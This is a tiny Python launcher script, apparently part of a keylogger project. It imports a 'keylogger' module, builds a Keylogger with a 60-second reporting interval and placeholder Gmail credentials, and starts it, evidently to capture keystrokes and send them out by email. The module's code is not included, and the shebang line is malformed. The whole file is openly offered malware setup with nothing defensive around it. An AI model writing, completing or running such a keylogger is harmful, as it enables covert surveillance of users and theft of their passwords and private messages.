#!/usr/bin/sh python

import keylogger

my_keylogger = keylogger.Keylogger(60, "test@gmail.com", "test_password")
my_keylogger.start()